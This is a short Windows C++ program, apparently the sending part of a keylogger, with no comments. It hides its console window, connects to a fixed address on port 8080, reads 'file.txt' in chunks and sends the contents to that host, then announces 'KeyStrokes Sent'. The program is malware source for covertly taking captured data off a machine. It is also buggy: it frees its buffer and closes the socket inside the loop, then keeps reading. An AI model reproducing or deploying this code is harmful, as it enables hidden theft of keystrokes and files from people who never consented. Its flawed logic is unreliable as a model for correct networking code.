#define _WIN32_WINNT 0x0A00
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <conio.h>
#include <iostream>
#include <fstream>
#include<cstdlib>
#include <bits/stdc++.h>

using namespace std;
#pragma comment(lib, "Ws2_32.lib")

int main(){
ShowWindow(GetConsoleWindow(),SW_HIDE);
const std::size_t chunksize= 1024  * 1024;
char* buffer = new char[chunksize];
std::string chunkName="chunk";
std::string fullChunkName;
int counter=0;

WSADATA wsaData;
    int wsaerr = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (wsaerr != 0) {
        std::cerr << "WSAStartup failed: " << wsaerr << std::endl;
        return 1;
    }
 int clientSocket = socket(AF_INET, SOCK_STREAM, 0);
    sockaddr_in serverAddress;
    serverAddress.sin_family = AF_INET;
    serverAddress.sin_port = htons(8080);
    serverAddress.sin_addr.s_addr = inet_addr("192.168.43.82");

connect(clientSocket, (struct sockaddr*)&serverAddress, sizeof(serverAddress));


std::ifstream file("file.txt", std::ios::binary|std::ios::ate);
std::streamsize size=file.tellg();
file.seekg(0,std::ios::beg);
if(!file.is_open()){
cerr<<"The file did not open correctly"<<endl;
system("pause");
return 1;
}
while(!file.eof()){

fullChunkName.clear();
fullChunkName.append(chunkName);
fullChunkName.append(".");

char intBuf[10];
fullChunkName.append(std::to_string(counter));

std::ofstream output(fullChunkName,ios::out|ios::trunc|ios::binary);
if(output.is_open()){
file.read(buffer,chunksize);
std::streamsize bytesize=file.gcount();
output.write(buffer, bytesize);
send(clientSocket,buffer,bytesize, 0);
output.close();
counter++;
closesocket(clientSocket);
WSACleanup();
delete[] buffer;
std::cout << "KeyStrokes Sent. Press Enter to exit...";
std::cin.get();  // Keeps window open



}

}
closesocket(clientSocket);
WSACleanup();
return 0;
}